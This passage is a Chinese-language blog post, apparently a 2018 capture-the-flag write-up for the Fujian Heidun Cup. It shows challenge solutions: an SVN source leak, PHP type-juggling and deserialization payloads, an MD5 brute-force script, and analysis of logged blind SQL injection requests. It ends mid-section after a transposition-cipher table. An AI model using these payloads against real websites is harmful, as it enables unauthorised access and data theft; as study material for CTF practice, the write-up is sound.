@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"findneo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="2018&#x2F;9&#x2F;16  福师大黑盾杯  信息泄露+代码审计svn泄露源码：http:&#x2F;&#x2F;192.168.200.200&#x2F;web&#x2F;codeaudit&#x2F;.svn&#x2F;text-base&#x2F;index.php.svn-base.txt  12345678910111213&lt;?phperror_reporting(0);$user &#x3D; $_COOKIE[&amp;#x27;user&amp;#x27;];$code &#x3D; $">
+<meta property="og:type" content="article">
+<meta property="og:title" content="福建省黑盾杯解题报告">
+<meta property="og:url" content="https://findneo.github.io/180920-heidunbei/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="2018&#x2F;9&#x2F;16  福师大黑盾杯  信息泄露+代码审计svn泄露源码：http:&#x2F;&#x2F;192.168.200.200&#x2F;web&#x2F;codeaudit&#x2F;.svn&#x2F;text-base&#x2F;index.php.svn-base.txt  12345678910111213&lt;?phperror_reporting(0);$user &#x3D; $_COOKIE[&amp;#x27;user&amp;#x27;];$code &#x3D; $">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://findneo.github.io/180920-heidunbei/1541605429359.png">
+<meta property="og:image" content="https://findneo.github.io/180920-heidunbei/1537109403700.png">
+<meta property="og:image" content="https://findneo.github.io/180920-heidunbei/1537070199581.png">
+<meta property="og:image" content="https://findneo.github.io/180920-heidunbei/1537420090085.png">
+<meta property="og:image" content="https://findneo.github.io/180920-heidunbei/1537420103233.png">
+<meta property="article:published_time" content="2018-09-20T06:07:27.000Z">
+<meta property="article:modified_time" content="2021-03-09T13:32:32.000Z">
+<meta property="article:author" content="findneo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://findneo.github.io/180920-heidunbei/1541605429359.png">
+
+<link rel="canonical" href="https://findneo.github.io/180920-heidunbei/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>福建省黑盾杯解题报告 | 闲言语</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">闲言语</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/180920-heidunbei/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/findneo.png">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          福建省黑盾杯解题报告
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-09-20 14:07:27" itemprop="dateCreated datePublished" datetime="2018-09-20T14:07:27+08:00">2018-09-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-09 21:32:32" itemprop="dateModified" datetime="2021-03-09T21:32:32+08:00">2021-03-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>2018/9/16  福师大黑盾杯</p>
+<p><img data-src="1541605429359.png" alt="1541605429359"></p>
+<h1 id="信息泄露-代码审计"><a href="#信息泄露-代码审计" class="headerlink" title="信息泄露+代码审计"></a>信息泄露+代码审计</h1><p>svn泄露源码：<a target="_blank" rel="noopener" href="http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt">http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt</a> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]?(<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span> == <span class="string">&#x27;admin&#x27;</span> &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$code</span>)) &#123;</span><br><span class="line">	<span class="variable">$hex</span> = (<span class="keyword">int</span>)<span class="variable">$code</span>;</span><br><span class="line">	<span class="keyword">if</span>((<span class="variable">$hex</span> ^ <span class="number">6789</span>) === <span class="number">0xCDEF</span>) &#123;</span><br><span class="line">		<span class="keyword">require</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;	</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>GET</code> 请求<code>code=55146</code> ，  请求头添加<code>Cookie: user=admin;</code> 。</p>
+<p><code>flag&#123;a737c5c5b759c3705c8100accf65b5e4&#125;</code> </p>
+<h1 id="最好的语言"><a href="#最好的语言" class="headerlink" title="最好的语言"></a>最好的语言</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>; </span><br><span class="line"><span class="variable">$b</span>=<span class="number">0</span>; </span><br><span class="line"><span class="variable">$c</span>=<span class="number">0</span>; </span><br><span class="line"><span class="variable">$d</span>=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>])) <span class="comment">//$x1=0;=&gt;$a=1;</span></span><br><span class="line">&#123; </span><br><span class="line">        <span class="variable">$x1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>]; </span><br><span class="line">        <span class="variable">$x1</span>==<span class="string">&quot;1&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>; </span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$x1</span>) </span><br><span class="line">        &#123; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: </span><br><span class="line">                <span class="variable">$a</span>=<span class="number">1</span>; </span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">        &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$x2</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;x2&#x27;</span>]); </span><br><span class="line"><span class="comment">//$x2=json_encode([&#x27;x21&#x27;=&gt;&#x27;2018hello&#x27;,&#x27;x22&#x27;=&gt;[[],0]]) ;</span></span><br><span class="line"><span class="comment">//string(32) &quot;&#123;&quot;x21&quot;:&quot;2018hello&quot;,&quot;x22&quot;:[[],0]&#125;&quot;</span></span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$x2</span>))&#123; </span><br><span class="line">    is_numeric(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>; </span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])&#123; </span><br><span class="line">        (<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>]&gt;<span class="number">2017</span>)?<span class="variable">$b</span>=<span class="number">1</span>:<span class="literal">NULL</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(is_array(@<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]))&#123; </span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>); </span><br><span class="line">        <span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]); </span><br><span class="line">        <span class="comment">//array_search — 在数组中搜索给定的值，如果成功则返回相应的键名 </span></span><br><span class="line">        <span class="comment">//mixed array_search( mixed $needle, array $haystack[, bool $strict = false] )</span></span><br><span class="line">        <span class="comment">//第三个参数决定在搜索时是否比较类型，默认不比较，也是这里能够绕过的原因。</span></span><br><span class="line">        <span class="comment">//var_dump(array_search(&#x27;XIPU&#x27;, array(&quot;0&quot;,&quot;1&quot;,0)));//int(2)</span></span><br><span class="line">        <span class="comment">//0==‘XIPU’为真，搜索到0值的下标为2</span></span><br><span class="line">        <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123; </span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="variable">$c</span>=<span class="number">1</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$x3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x3&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x3</span> != <span class="string">&#x27;15562&#x27;</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (strstr(<span class="variable">$x3</span>, <span class="string">&#x27;XIPU&#x27;</span>)) &#123; </span><br><span class="line">        <span class="keyword">if</span> (substr(md5(<span class="variable">$x3</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123; </span><br><span class="line">            <span class="comment">//两个符合正则  /0e\d+/  的字符串弱相等。</span></span><br><span class="line">            <span class="comment">// 爆破见下方python代码</span></span><br><span class="line">            <span class="variable">$d</span>=<span class="number">1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span> &amp;&amp; <span class="variable">$c</span> &amp;&amp; <span class="variable">$d</span>)&#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span>():</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">                    x = <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c)+s</span><br><span class="line">                    mm=md5(x.encode(<span class="string">&#x27;UTF-8&#x27;</span>)).hexdigest()</span><br><span class="line">                    flag=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> mm[<span class="number">10</span>:<span class="number">24</span>]:</span><br><span class="line">                        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;0123456789&#x27;</span>:</span><br><span class="line">                            flag=<span class="number">0</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">and</span> mm[<span class="number">8</span>:<span class="number">10</span>]==<span class="string">&#x27;0e&#x27;</span>:</span><br><span class="line">                        print(x)</span><br><span class="line"></span><br><span class="line">brute()</span><br><span class="line"><span class="comment"># kN[XIPU</span></span><br><span class="line"><span class="comment"># v=|XIPU</span></span><br><span class="line"><span class="comment"># y&#x27;wXIPU</span></span><br><span class="line"><span class="comment"># &#125;MOXIPU</span></span><br><span class="line"><span class="comment"># ~VhXIPU</span></span><br><span class="line"><span class="comment">## http://192.168.200.200/web/bestlanguage/?x1=0&amp;x2=&#123;%22x21%22:%222018hello%22,%22x22%22:[[],0]&#125;&amp;x3=~VhXIPU</span></span><br><span class="line"><span class="comment">## flag&#123;510ea2879fa29d0d618b1f55350965c3&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="the-user-is-admin"><a href="#the-user-is-admin" class="headerlink" title="the user is admin"></a>the user is admin</h1><p>和 bugku 平台某个题目原理相似，因此没有保留源码。可以参考 <a href="https://findneo.github.io/180406BugkuWriteup/#welcome-to-bugkuctf">该题</a> ，不赘述。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/web/theuserisadmin/?file=<span class="keyword">class</span>.php&amp;user=php:<span class="comment">//input&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">post:the user is admin</span><br><span class="line">    </span><br><span class="line"><span class="comment">//flag&#123;078d8dd8023d5716a11780adf344dfd2&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="ccgs"><a href="#ccgs" class="headerlink" title="ccgs"></a>ccgs</h1><p><img data-src="1537109403700.png" alt="1537109403700"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e sgcc.png</span><br><span class="line">cat secret.txt | base64 -d | base64 -d &gt; final.png</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="1537070199581.png" alt="1537070199581"></p>
+<h1 id="注入日志分析"><a href="#注入日志分析" class="headerlink" title="注入日志分析"></a>注入日志分析</h1><p>给了一个日志文件，<code>file data.log</code>得到是一个文本文件，直接打开，前几行是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Software: Microsoft Internet Information Services 6.0</span><br><span class="line">#Version: 1.0</span><br><span class="line">#Date: 2015-10-21 09:16:34</span><br></pre></td></tr></table></figure>
+
+<p>猜测是IIS服务器记录的流量日志， 分析前几行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET &#x2F;index.htm - 80 - 192.168.1.101 Mozilla&#x2F;5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko&#x2F;20100101+Firefox&#x2F;41.0 200 0 0</span><br><span class="line">2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET &#x2F;favicon.ico - 80 - 192.168.1.101 Mozilla&#x2F;5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko&#x2F;20100101+Firefox&#x2F;41.0 404 0 2</span><br><span class="line">2015-10-21 09:16:36 W3SVC1 192.168.1.135 GET &#x2F;show.asp id&#x3D;2 80 - 192.168.1.101 Mozilla&#x2F;5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko&#x2F;20100101+Firefox&#x2F;41.0 200 0 0</span><br><span class="line">2015-10-21 09:25:01 W3SVC1 192.168.1.135 GET &#x2F;show.asp id&#x3D;2%27|17|80040e14|字符串_&#39;&#39;_之前有未闭合的引号。 80 - 192.168.1.101 Mozilla&#x2F;5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko&#x2F;20100101+Firefox&#x2F;41.0 500 0 0</span><br></pre></td></tr></table></figure>
+
+<p>可以看到就是一条条的HTTP请求，并且后面跟着状态码。继续浏览，看到<code>id</code>字段出现一些<code>SQL</code>的关键字，那么可以想到这记录的就是<code>sqlmap</code>(或许)的注入流量分析。思路就是找到关键的注入请求，文件很大，我们可以搜索<code>flag</code>试试，找到关键的请求如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET &#x2F;show.asp id&#x3D;2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla&#x2F;5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko&#x2F;20090423+Firefox&#x2F;3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET &#x2F;show.asp id&#x3D;2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E48 80 - 192.168.1.101 Mozilla&#x2F;5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko&#x2F;20090423+Firefox&#x2F;3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>可以利用文本编辑器如<code>sublime text 3</code>的<code>ctrl+H</code>的替换功能， 将关键流量进行精简并<code>urldecode</code>利于分析(截取两个代表性请求)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))&gt;51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 500 0 0</span><br><span class="line">id&#x3D;2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))&gt;48 80 200 0 0</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里是二分法盲注的HTTP请求，现在思路很明确了， 从<code>SUBSTRING(.*, 1, 1)</code>开始找，并且只要看最后几条的注入请求就可以判断出字符是多少。 比如<code>SUBSTRING(.*, 1, 1) &gt; 48</code>的状态码是<code>200</code>，<code>SUBSTRING(.*, 1, 1) &gt; 49</code>的状态码是<code>500</code>，那其实就可以确定字符的ascii码是49。就这样就能得到<code>theflag</code>的值。</p>
+<h1 id="brightstar"><a href="#brightstar" class="headerlink" title="brightstar"></a>brightstar</h1><p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/others/#_9">列移位密码</a> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees</span><br><span class="line">key： howarey</span><br><span class="line">Columnar Transposition Cipher</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>h</th>
+<th>o</th>
+<th>w</th>
+<th>a</th>
+<th>r</th>
+<th>e</th>
+<th>y</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>3</td>
+<td>4</td>
+<td>6</td>
+<td>1</td>
+<td>5</td>
+<td>2</td>
+<td>7</td>
+</tr>
+<tr>
+<td>I</td>
+<td>t</td>
+<td>i</td>
+<td>s</td>
+<td>o</td>
+<td>f</td>
+<td>t</td>
+</tr>
+<tr>
+<td>e</td>
+<td>n</td>
+<td>i</td>
+<td>n</td>
+<td>t</td>
+<td>h</td>
+<td>e</td>
+</tr>
+<tr>
+<td>d</td>
+<td>a</td>
+<td>r</td>
+<td>k</td>
+<td>e</td>
+<td>s</td>
+<td>t</td>
+</tr>
+<tr>
+<td>s</td>
+<td>k</td>
+<td>i</td>
+<td>e</td>
+<td>s</td>
+<td>t</td>
+<td>h</td>
+</tr>
+<tr>
+<td>a</td>
+<td>t</td>
+<td>w</td>
+<td>e</td>
+<td>s</td>
+<td>e</td>
+<td>e</td>
+</tr>
+<tr>
+<td>b</td>
+<td>r</td>
+<td>i</td>
+<td>g</td>
+<td>h</td>
+<td>t</td>
+<td>e</td>
+</tr>
+<tr>
+<td>s</td>
+<td>t</td>
+<td>s</td>
+<td>t</td>
+<td>a</td>
+<td>r</td>
+<td>s</td>
+</tr>
+</tbody></table>
+<p>或者</p>
